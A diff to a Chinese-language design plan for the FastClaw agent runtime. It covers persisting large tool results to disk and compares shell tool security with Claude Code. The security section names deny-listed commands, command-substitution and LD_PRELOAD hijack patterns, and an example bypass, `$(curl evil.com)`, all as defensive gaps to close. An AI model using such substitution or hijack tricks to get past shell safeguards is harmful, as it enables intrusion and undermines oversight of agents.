@@ -1369,102 +1369,266 @@ pub trait Tool: Send + Sync {
 | `SnipTool` | SnipTool (~20行) | ~20行 | 何时主动裁剪 |
 | `ToolSearchTool` | ToolSearchTool (~20行) | ~20行 | 搜索 vs 直接 select |
 
-### 11.5 工具截断重构：Persist-to-Disk 策略
+### 11.5 工具截断重构：Persist-to-Disk 策略（v7 深度对齐）
 
-> 对齐 CC 的 `toolResultStorage.ts`
+> 深度对齐 CC 的 `toolResultStorage.ts`（1041 行）+ `toolLimits.ts` + query-loop 集成。
+> v6 版方案仅覆盖了表层 API，以下为 v7 补全：补充 ContentReplacementState、Infinity opt-out、
+> per-message 分组逻辑、transcript record、session resume 重建等关键缺失。
 
-**CC 的工具结果处理（3 层）：**
+#### 11.5.1 CC 工具结果处理全貌（4 层）
 
-1. **Per-tool persistence threshold** — 每工具声明 `maxResultSizeChars`（默认 50K，ShellTool 30K，ReadFile ∞），超过阈值时**整个结果持久化到磁盘**，替换为 2KB preview + 文件路径引用
-2. **Per-message aggregate budget** (200K) — 同一轮 N 个并行工具结果总和超过 200K 时，最大的结果被持久化
-3. **MicroCompact** (渐进淡化) — 老结果随时间淡化
+| 层次 | 名称 | 触发点 | 核心逻辑 |
+|------|------|--------|----------|
+| L1 | Per-tool persistence | 工具执行后立即 | 结果 > `getPersistenceThreshold(tool)` → 整体持久化到磁盘，替换为 2KB preview |
+| L2 | Per-message aggregate budget | query loop 发 API 前 | 同一 wire-level user message 所有 tool_result 总和 > 200K → 最大的 fresh 结果被持久化 |
+| L3 | Empty result marker | L1 内部 | 空结果 → `(tool_name completed with no output)` marker，防止模型误触 stop sequence |
+| L4 | MicroCompact 渐进淡化 | context window 压缩时 | 老结果 full → preview → oneliner（**FastClaw 已有**） |
 
-**FastClaw 当前问题：**
-- 截断是 in-place 的（head 20% + tail 80%），截断后**信息丢失**
-- 没有 per-message aggregate budget — 10 个并行工具各 1500 chars = 15K OK，但如果 limit 提高，可能爆
-- 保存到 temp 文件的路径不稳定（含时间戳），重启后丢失
+**CC 各工具 maxResultSizeChars 分布（关键值）：**
 
-**重构方案：**
+| 工具 | maxResultSizeChars | 说明 |
+|------|-------------------|------|
+| FileReadTool | **Infinity** | **不持久化**（自身通过 maxTokens 限制大小；持久化后 agent 用 ReadFile 读回 = 死循环） |
+| BashTool / PowerShellTool | 30_000 | 命令输出 |
+| GrepTool | 20_000 | 搜索结果 |
+| SleepTool | 1_000 | 极短确认 |
+| SnipTool / SubscribePRTool / SendUserFileTool | 5_000 | 小型输出 |
+| VerifyPlanExecution / MonitorTool / McpAuthTool / DiscoverSkills | 10_000 | 中型输出 |
+| 其余大多数工具 | 100_000 | 标准上限 |
+| **系统全局 cap** | **DEFAULT_MAX_RESULT_SIZE_CHARS = 50_000** | `Math.min(declared, 50K)`，但 Infinity 跳过此 clamp |
+
+**注意**：`getPersistenceThreshold()` 的优先级为：
+1. Infinity → 直接返回 Infinity（不持久化，跳过后续所有逻辑）
+2. GrowthBook 运行时 override → 精确覆盖（CC 可远程调参）
+3. `Math.min(declared, DEFAULT_MAX_RESULT_SIZE_CHARS)` → 兜底
+
+#### 11.5.2 FastClaw 当前问题（7 项差距）
+
+| # | 差距 | 当前状态 | CC 行为 | 影响 |
+|---|------|---------|---------|------|
+| 1 | **Per-tool 阈值过低** | 200~1500 chars（`tool_output_char_limit`） | 30K~100K | 大量有效信息被截断，agent 频繁 re-read |
+| 2 | **信息永久丢失** | head 20% + tail 80% in-place 截断 | 整体持久化到磁盘 + 2KB preview | 中间内容不可恢复 |
+| 3 | **文件路径不稳定** | `/tmp/fastclaw_truncated/<timestamp>_<tool>.output` | `<projectDir>/<sessionId>/tool-results/<toolUseId>.txt` | 重启后文件丢失 |
+| 4 | **无 per-message aggregate budget** | 无 | 200K per wire-level user message | 并行工具可能 context 爆炸 |
+| 5 | **无空结果 marker** | 空字符串原样传入 | `(tool_name completed with no output)` | 某些模型会误触 stop sequence |
+| 6 | **无 ContentReplacementState** | 无 | seenIds + replacements Map，决策不可变 | 无法保证 prompt cache 前缀稳定 |
+| 7 | **无 Infinity opt-out** | read_file 也被截断 | ReadFile maxResultSizeChars=Infinity | ReadFile 输出被截断后 agent 死循环 re-read |
+
+#### 11.5.3 重构方案：ToolResultStorage + ContentReplacementState
+
+**新文件**：`crates/fastclaw-agent/src/runtime/tool_result_storage.rs`
 
 ```rust
-// crates/fastclaw-agent/src/runtime/tool_result_storage.rs (新文件)
+use std::collections::{HashMap, HashSet};
+use std::path::{Path, PathBuf};
 
-/// 工具结果持久化策略常量
+// ─── 常量 ───────────────────────────────────────────────────
+
+/// 单工具结果持久化阈值（系统全局 cap）
 pub const DEFAULT_MAX_RESULT_SIZE_CHARS: usize = 50_000;
+
+/// 同一轮（wire-level user message）所有 tool_result 的聚合上限
 pub const MAX_TOOL_RESULTS_PER_MESSAGE_CHARS: usize = 200_000;
+
+/// Preview 截取字节数
 pub const PREVIEW_SIZE_BYTES: usize = 2000;
 
-/// 持久化大工具结果到会话目录
+/// Token 估算: ~4 bytes per token
+pub const BYTES_PER_TOKEN: usize = 4;
+
+/// XML 标签（用于检测已持久化的内容，避免重复处理）
+pub const PERSISTED_OUTPUT_TAG: &str = "<persisted-output>";
+pub const PERSISTED_OUTPUT_CLOSING_TAG: &str = "</persisted-output>";
+
+/// 空结果 marker
+pub const EMPTY_RESULT_MARKER_FN: fn(&str) -> String = |tool_name| {
+    format!("({tool_name} completed with no output)")
+};
+
+// ─── Per-tool threshold 解析 ────────────────────────────────
+
+/// 解析有效持久化阈值。
+/// Infinity（usize::MAX）= 不持久化（如 ReadFile）；否则 min(declared, 50K)。
+pub fn get_persistence_threshold(declared: usize) -> usize {
+    if declared == usize::MAX { return usize::MAX; } // Infinity opt-out
+    declared.min(DEFAULT_MAX_RESULT_SIZE_CHARS)
+}
+
+// ─── ContentReplacementState ────────────────────────────────
+//
+// 核心不变式：一个 tool_use_id 一旦进入 seen_ids，其命运（替换或保留）
+// 不再改变。这保证了 prompt cache 前缀在每轮 API 调用间保持字节级一致。
+//
+// 分区逻辑（per message group）：
+//   mustReapply: 在 replacements 中 → 重新应用缓存的 preview 字符串（零 I/O）
+//   frozen:      在 seen_ids 但不在 replacements → 保留原文，永不替换
+//   fresh:       不在 seen_ids → 新候选，按 size 降序选择持久化
+
+pub struct ContentReplacementState {
+    /// 所有已评估过的 tool_use_id（命运不可变）
+    pub seen_ids: HashSet<String>,
+    /// tool_use_id → 替换后的完整 preview 字符串（字节级确定性）
+    pub replacements: HashMap<String, String>,
+}
+
+/// 持久化决策的 transcript 记录（用于 session resume 重建）
+pub struct ContentReplacementRecord {
+    pub tool_use_id: String,
+    pub replacement: String,
+}
+
+// ─── ToolResultStorage 主体 ─────────────────────────────────
+
 pub struct ToolResultStorage {
-    session_dir: PathBuf,       // ~/.fastclaw/sessions/<session_id>/tool-results/
-    seen_ids: HashSet<String>,  // 已处理过的 tool_use_id（决策不可变）
-    replacements: HashMap<String, String>,  // tool_use_id → 替换后的 preview 文本
+    session_dir: PathBuf,  // ~/.fastclaw/sessions/<session_id>/tool-results/
 }
 
 impl ToolResultStorage {
-    /// 处理单个工具结果：超过阈值时持久化到磁盘，返回 preview。
+    /// 处理单个工具结果（Layer 1: per-tool persistence）
+    ///
+    /// 流程：
+    /// 1. 空结果 → 返回 marker
+    /// 2. 已持久化（content 以 PERSISTED_OUTPUT_TAG 开头）→ 原样返回
+    /// 3. content.len() <= threshold → 原样返回
+    /// 4. threshold == usize::MAX（Infinity opt-out，如 ReadFile）→ 原样返回
+    /// 5. 持久化到 session_dir/tool-results/<tool_use_id>.txt
+    /// 6. 返回 <persisted-output> XML 包裹的 preview + 文件路径
     pub async fn process_result(
-        &mut self,
+        &self,
         tool_use_id: &str,
         tool_name: &str,
         content: &str,
-        max_result_size: usize,
-    ) -> String {
-        let threshold = max_result_size.min(DEFAULT_MAX_RESULT_SIZE_CHARS);
-        if content.len() <= threshold {
-            return content.to_string();
-        }
-        // 持久化到 session_dir/tool-results/<tool_use_id>.txt
-        let filepath = self.persist(tool_use_id, content).await;
-        let preview = self.generate_preview(content);
-        let message = format!(
-            "<persisted-output>\n\
-             Output too large ({} chars). Full output saved to: {}\n\n\
-             Preview (first ~2KB):\n{}\n...\n\
-             </persisted-output>",
-            content.len(), filepath.display(), preview
-        );
-        self.replacements.insert(tool_use_id.to_string(), message.clone());
-        message
-    }
+        declared_max_result_size: usize,
+    ) -> String { /* ... */ }
 
-    /// 对一轮的所有工具结果执行 per-message aggregate budget 检查。
-    /// 当总和超过 200K 时，最大的结果被持久化。
+    /// Layer 2: 对一轮的所有工具结果执行 per-message aggregate budget
+    ///
+    /// 输入：按 wire-level user message 分组的候选 tool_result。
+    /// 流程：
+    /// 1. 分区为 mustReapply / frozen / fresh
+    /// 2. mustReapply: 从 state.replacements 重新应用（零 I/O，字节一致）
+    /// 3. fresh: 计算 frozen_size + fresh_size，若超 budget 则按 size 降序持久化
+    /// 4. 持久化后更新 state.seen_ids + state.replacements
+    /// 5. 跳过 Infinity-threshold 工具（skip_tool_names）
+    ///
+    /// 返回：(替换后的消息, 本轮新增的 ContentReplacementRecord[])
     pub async fn enforce_per_message_budget(
-        &mut self,
-        results: &mut [(String, String, String)], // (tool_use_id, tool_name, content)
-    ) {
-        let total: usize = results.iter().map(|(_, _, c)| c.len()).sum();
-        if total <= MAX_TOOL_RESULTS_PER_MESSAGE_CHARS {
-            return;
-        }
-        // 按 size 降序，持久化最大的直到总量 < budget
-        let mut indices: Vec<usize> = (0..results.len()).collect();
-        indices.sort_by(|a, b| results[*b].2.len().cmp(&results[*a].2.len()));
-        let mut remaining = total;
-        for idx in indices {
-            if remaining <= MAX_TOOL_RESULTS_PER_MESSAGE_CHARS { break; }
-            let (id, name, content) = &results[idx];
-            let replaced = self.process_result(id, name, content, usize::MAX).await;
-            remaining -= content.len();
-            remaining += replaced.len();
-            results[idx].2 = replaced;
-        }
-    }
+        &self,
+        messages: &mut Vec<ChatMessage>,
+        state: &mut ContentReplacementState,
+        skip_tool_names: &HashSet<String>,
+    ) -> Vec<ContentReplacementRecord> { /* ... */ }
+
+    /// 持久化内容到磁盘。使用 O_EXCL（'wx'）避免重复写入。
+    async fn persist(&self, tool_use_id: &str, content: &str) -> PathBuf { /* ... */ }
+
+    /// 生成 preview：在 PREVIEW_SIZE_BYTES 附近的换行处截断。
+    fn generate_preview(content: &str) -> (String, bool) { /* ... */ }
+
+    /// 从 transcript records 重建 ContentReplacementState（session resume）。
+    /// 冻结 messages 中所有已存在的 tool_use_id，恢复 replacements Map。
+    pub fn reconstruct_state(
+        messages: &[ChatMessage],
+        records: &[ContentReplacementRecord],
+    ) -> ContentReplacementState { /* ... */ }
 }
 ```
 
-**关键改进 vs 当前实现：**
+#### 11.5.4 Per-message 分组逻辑
 
-| 维度 | 当前 (v5) | 重构后 (v6) |
-|------|-----------|-------------|
-| 截断策略 | head 20% + tail 80% in-place | 整体持久化到磁盘 + 2KB preview |
-| 信息丢失 | 中间部分永久丢失 | 完整内容可通过 ReadFile 恢复 |
-| 文件路径 | `/tmp/fastclaw_truncated/<ts>_<tool>.txt` | `~/.fastclaw/sessions/<sid>/tool-results/<tool_use_id>.txt` |
-| 持久性 | 重启丢失 | 跟随 session 持久化 |
-| Per-message budget | 无 | 200K aggregate limit |
-| 空结果处理 | 无 | `(tool_name completed with no output)` marker |
-| Cache 稳定性 | N/A | 决策一旦做出不可变（seenIds frozen） |
+CC 在 `enforceToolResultBudget` 中按 **wire-level user message 分组**评估 budget：
+
+```
+[user(tr_A), user(tr_B), user(tr_C)]  → API 合并为 1 个 user message → 作为 1 个 group 评估
+[asst(X)]                              → 分组边界
+[user(tr_D)]                           → 新 group
+```
+
+关键点：
+- `normalizeMessagesForAPI` 会将连续的 user messages 合并为一个（Bedrock 兼容）
+- progress/attachment/system 消息不创建 wire 边界 → 不拆分 group
+- 同一 assistant message ID 的多个片段（流式输出）不创建新边界
+- **FastClaw 对齐**：`ChatMessage::role == Tool` 连续出现时（并行工具），作为同一 group
+
+#### 11.5.5 Infinity Opt-out 规则
+
+`ReadFile` 的 `maxResultSizeChars = Infinity`（Rust 中 `usize::MAX`）语义：
+
+1. **Layer 1 (per-tool)**：`get_persistence_threshold(usize::MAX) → usize::MAX` → 跳过持久化
+2. **Layer 2 (aggregate budget)**：加入 `skip_tool_names` 集合 → 不参与 budget 计算
+3. **原因**：ReadFile 输出被持久化后，agent 需要再调 ReadFile 读回 → 死循环
+4. **ReadFile 自身通过 `max_tokens` 参数控制输出大小**
+
+FastClaw 对齐：`Tool::max_result_size_chars()` 返回 `usize::MAX` 的工具自动进入 skip set。
+
+#### 11.5.6 Transcript Records & Session Resume
+
+CC 将每次 `enforce_per_message_budget` 产生的新替换决策写入 transcript：
+
+```json
+{ "kind": "tool-result", "toolUseId": "...", "replacement": "..." }
+```
+
+Session resume 时通过 `reconstructContentReplacementState(messages, records)` 重建：
+1. 遍历 messages 中所有 tool_result 的 tool_use_id → 全部标记为 `seen_ids`（冻结）
+2. 从 records 恢复 `replacements` Map → 确保重新应用相同的 preview 字符串
+
+**FastClaw 对齐**：`ContentReplacementRecord` 序列化到 session SQLite（与现有 `fastclaw-session` 集成）。
+
+#### 11.5.7 集成点：query loop
+
+CC 在 `query.ts` 中 API 调用前插入 budget enforcement：
+
+```
+1. 组装 messagesForQuery
+2. → applyToolResultBudget(messages, state, writeCallback, skipToolNames)  ← 这里
+3. → normalizeMessagesForAPI(messages)
+4. → API call
+```
+
+**FastClaw 对齐**：在 `execute_stream` 的 LLM 调用前，调用 `ToolResultStorage::enforce_per_message_budget`。
+
+#### 11.5.8 Per-tool 阈值迁移
+
+当前 `tool_output_char_limit()` 的硬编码 match 表需要**废弃**，改为 `Tool::max_result_size_chars()` 声明：
+
+| 工具 | 当前 limit | 迁移后 max_result_size_chars | 有效阈值（min(declared, 50K)） |
+|------|-----------|------------------------------|-------------------------------|
+| read_file | 1200 | **usize::MAX** | **不持久化** |
+| shell / run_command | 1200 | 30_000 | 30_000 |
+| grep / glob | 800 | 20_000 | 20_000 |
+| write_file / edit_file | 200 | 100_000 | 50_000 |
+| web_fetch | 1500 | 100_000 | 50_000 |
+| web_search | 800 | 100_000 | 50_000 |
+| memory_store / todo_write | 1000 | 5_000 | 5_000 |
+| list_dir | 600 | 50_000 | 50_000 |
+| snip | N/A | 5_000 | 5_000 |
+| sleep | N/A | 1_000 | 1_000 |
+| 其余 | 1500 | 100_000 | 50_000 |
+
+**迁移策略**：
+1. `Tool::max_result_size_chars()` 新增 trait 默认实现 → `100_000`
+2. 各工具覆写为上表值
+3. `tool_output_char_limit()` 硬编码表删除
+4. `truncate_tool_result_output_with_limit()` 保留为 **fallback**（持久化 I/O 失败时降级使用）
+
+#### 11.5.9 改进对照表（v7）
+
+| 维度 | 当前 (v5) | 重构后 (v7) | CC 对应 |
+|------|-----------|-------------|---------|
+| 截断策略 | head 20% + tail 80% in-place | 整体持久化到磁盘 + 2KB preview | ✅ 对齐 |
+| 信息丢失 | 中间部分永久丢失 | 完整内容可通过 ReadFile 恢复 | ✅ 对齐 |
+| 文件路径 | `/tmp/fastclaw_truncated/<ts>_<tool>.txt` | `~/.fastclaw/sessions/<sid>/tool-results/<id>.txt` | ✅ 对齐 |
+| 持久性 | 重启丢失 | 跟随 session 持久化 + SQLite 记录 | ✅ 对齐 |
+| Per-tool 阈值 | 200~1500 chars | 1K~100K chars（Tool trait 声明） | ✅ 对齐 |
+| Per-message budget | 无 | 200K aggregate limit | ✅ 对齐 |
+| 空结果处理 | 无 | `(tool_name completed with no output)` marker | ✅ 对齐 |
+| Cache 稳定性 | N/A | ContentReplacementState 决策不可变 | ✅ 对齐 |
+| Infinity opt-out | 无（read_file 也截断） | read_file usize::MAX → 不持久化 | ✅ 对齐 |
+| 分组逻辑 | N/A | 连续 Tool message group 作为 1 个 budget 单元 | ✅ 对齐 |
+| Session resume | N/A | SQLite 存储 ContentReplacementRecord → 重建 | ✅ 对齐 |
+| 运行时 override | 无 | config/default.json 可配置阈值（未来扩展） | 简化版 |
+| Fallback | 唯一策略 | 持久化 I/O 失败时降级为 head/tail 截断 | ✅ CC 也有 fallback |
 
 ### 11.6 `build_messages` 重构
 
@@ -1509,7 +1673,7 @@ fn build_messages_with_subagent_ctx(...) -> Vec<ChatMessage> {
 | Phase 2: QueryEngine + P0 工具 | ✅ DONE | - |
 | Phase 3: 前端 IM | ✅ DONE | - |
 | Phase 4: Context Collapse + P1 工具 | 8/16 DONE | 1.5周（完成剩余） |
-| **Phase 4.5: PromptEngine + 工具截断重构** | **新增** | **2.5~3 周** |
+| **Phase 4.5: PromptEngine + 工具截断重构** | **新增（21 tasks）** | **3~3.5 周** |
 | Phase 5: 测试与优化 | PENDING | 1 周 |
 | **修正后总剩余** | | **~5~5.5 周** |
 
@@ -1523,9 +1687,11 @@ fn build_messages_with_subagent_ctx(...) -> Vec<ChatMessage> {
 |------|---------|---------|
 | Prompt 系统 | 静态 md 文件拼接 | **PromptEngine：21 个 section + 缓存 + 动态边界** |
 | 工具行为指导 | 短 description 字符串 | **Tool.prompt() 返回完整行为规范（50~370行/工具）** |
-| 工具截断 | head/tail in-place 截断 | **persist-to-disk + 2KB preview + ReadFile 恢复** |
-| Per-message budget | 无 | **200K aggregate limit（防并行工具 context 爆炸）** |
+| 工具截断 | head/tail in-place 截断（200~1500 chars） | **persist-to-disk + 2KB preview + ReadFile 恢复（1K~100K threshold）** |
+| Per-message budget | 无 | **200K aggregate limit + ContentReplacementState prompt cache 稳定** |
 | 空结果处理 | 无 | **marker 文本（防模型误判 stop sequence）** |
+| Infinity opt-out | 无（ReadFile 也截断） | **ReadFile usize::MAX → 不持久化，防死循环** |
+| Session resume | 无 | **ContentReplacementRecord SQLite → 重建决策状态** |
 | 模式感知 | 无 | **Plan/Agent/Auto 影响 tool 可用性和 prompt** |
 
 ### 预期成果（在 v5 基础上新增）
@@ -1537,3 +1703,97 @@ fn build_messages_with_subagent_ctx(...) -> Vec<ChatMessage> {
 - ✅ **Prompt cache 友好**：静态/动态分离 + section 缓存 + 决策不可变
 - ✅ **模式感知 Prompt**：Plan 模式自动禁用 write 工具 + 调整行为指导
 - ✅ **优先级层叠**：override > agent > custom > default + append
+
+---
+
+## 十二、Shell 工具安全纵深对比：FastClaw vs Claude Code
+
+> 基于 CC `packages/builtin-tools/src/tools/BashTool/` (10,894 行) vs FC `crates/fastclaw-agent/src/builtin_tools/shell.rs` (1,234 行) 的深入对比。
+
+### 12.1 代码量对比
+
+| 模块 | CC (BashTool) | FC (ShellTool) | 差距 |
+|------|-------------|---------------|------|
+| 主逻辑 | `BashTool.tsx` 1,472行 | `shell.rs` 1,234行 | 基本对齐 |
+| 安全验证 | `bashSecurity.ts` 2,592行 | `validate_command()` ~80行 | **CC 32x** |
+| 权限系统 | `bashPermissions.ts` 2,621行 | 无独立系统 | **CC 独有** |
+| 路径安全 | `pathValidation.ts` 1,303行 | `validate_working_dir()` ~30行 | **CC 43x** |
+| sed 拦截 | `sedValidation.ts` 684行 + `sedEditParser.ts` 322行 | 无 | **CC 独有** |
+| 只读模式 | `readOnlyValidation.ts` 1,990行 + `modeValidation.ts` 115行 | `ToolKind::Execute` 拦截 | **CC 远超** |
+| 沙箱 | `sandbox-adapter.ts` 985行 + `shouldUseSandbox.ts` 153行 + `@anthropic-ai/sandbox-runtime` | `ShellSandboxConfig` + `use_namespace: bool`（未实现） | **CC 远超** |
+| Prompt | `prompt.ts` 369行 | `SHELL_TOOL_PROMPT` ~110行 | CC 3x |
+| **总计** | **~10,894行** | **~1,234行** | **CC 8.8x** |
+
+### 12.2 安全能力层次对比
+
+#### 层次 1：命令黑名单（FC ✅ / CC ✅）
+
+- **FC**：`denied_commands` 列表（sudo, mkfs, dd 等 18 个）+ `denied_patterns` 正则（8 个）
+- **CC**：`disabledCommands` 动态配置 + 用户配置 `excludedCommands`（prefix/exact/wildcard）
+- **评价**：FC 基础能力到位，但 CC 支持更灵活的匹配模式
+
+#### 层次 2：命令替换/注入检测（FC ❌ / CC ✅）
+
+CC 的 `bashSecurity.ts` 检测 19 种命令替换/注入模式：
+- `$()` 命令替换、`${}` 参数替换、`<()` / `>()` 进程替换
+- Zsh 等号扩展 `=cmd`、glob qualifiers `(e:`、always 块
+- PowerShell 注释语法 `<#`（防御性编程）
+- 反引号（区分转义 vs 非转义）
+
+FC 完全没有这一层。攻击者可以通过 `$(curl evil.com)` 等方式绕过黑名单。
+
+#### 层次 3：环境变量劫持检测（FC 部分 / CC ✅）
+
+- **CC**：检测 `PATH=`、`LD_PRELOAD=`、`LD_LIBRARY_PATH=` 等二进制劫持变量前缀，剥离 wrapper 命令（`timeout`、`nice`、`env`、`nohup`）后再验证
+- **FC**：`strip_env_vars` 在执行前剥离敏感变量（不同方向 — 保护密钥不泄露，但不防劫持）
+- **评价**：解决不同问题。CC 防止通过环境变量绕过命令拦截；FC 防止密钥泄露
+
+#### 层次 4：路径安全（FC 基础 / CC ✅✅）
+
+- **CC** `pathValidation.ts` 1,303行：
+  - 写操作目标文件路径验证（不只是 cwd）
+  - Symlink 链解析后再验证
+  - `../` 规范化
+  - Home 目录配置文件保护
+- **FC**：仅检查 `working_dir` 是否在 `allowed_dirs` 内，**不验证命令操作的目标文件**
+
+#### 层次 5：OS 级进程沙箱（FC ❌ / CC ✅）
+
+- **CC**：通过 `@anthropic-ai/sandbox-runtime` 外部包实现：
+  - Linux: namespace 隔离（文件系统 + 网络）
+  - macOS: sandbox-exec profile
+  - 文件系统路径级 ACL（read denyOnly + write allowOnly）
+  - 网络主机级 ACL（allowedHosts / deniedHosts）
+  - `$TMPDIR` 自动设置
+  - `dangerouslyDisableSandbox` 参数可绕过（需用户确认）
+- **FC**：`use_namespace: bool` 字段存在但**所有执行逻辑未实现**
+
+#### 层次 6：Plan Mode 命令分类（FC 基础 / CC ✅✅）
+
+- **CC** `readOnlyValidation.ts` 1,990行：
+  - 将命令分为 readonly / write / dangerous 三类
+  - 只读模式下只允许 readonly 命令
+  - 支持管道、重定向、子命令的递归分析
+- **FC**：Plan Mode 只在 `ToolKind` 级别拦截 `Execute`，即**整个 ShellTool 在 Plan Mode 下不可用**（粒度太粗，CC 允许只读 shell 命令如 `ls`、`git status`）
+
+### 12.3 其他工具对比
+
+| 工具 | CC 行数 | FC 行数 | 评价 |
+|------|---------|---------|------|
+| FileRead | 1,418 | ~300 | FC 基础对齐，CC 有专门的图片处理器 |
+| FileWrite | 445 | ~200 | 基本对齐 |
+| FileEdit | 1,612 | ~1,200（含 MultiEdit + ApplyPatch） | **FC 更强**（三种编辑工具） |
+| Glob | 205 | ~200 | 对齐 |
+| Grep | 595 | ~300 | 基本对齐 |
+
+### 12.4 待补齐任务清单
+
+| 优先级 | 能力 | 预计工作量 | 说明 |
+|--------|------|----------|------|
+| **P0** | 命令替换/注入检测 | 2-3d | 至少检测 `$()`, `${}`, 反引号, 进程替换 |
+| **P0** | Plan Mode 命令分类器 | 2d | 允许只读命令在 Plan Mode 执行 |
+| **P1** | 路径安全验证 | 2d | 目标文件路径 + symlink 解析 |
+| **P1** | 权限规则引擎 | 2-3d | prefix/exact/wildcard 匹配 |
+| **P2** | OS 级进程沙箱 | 5-7d | Linux namespace 隔离 |
+| **P2** | sed → FileEdit 转换 | 2d | 解析 sed 脚本转 FileEdit |
+| **P3** | 环境变量劫持检测 | 1d | PATH/LD_PRELOAD 前缀检测 |
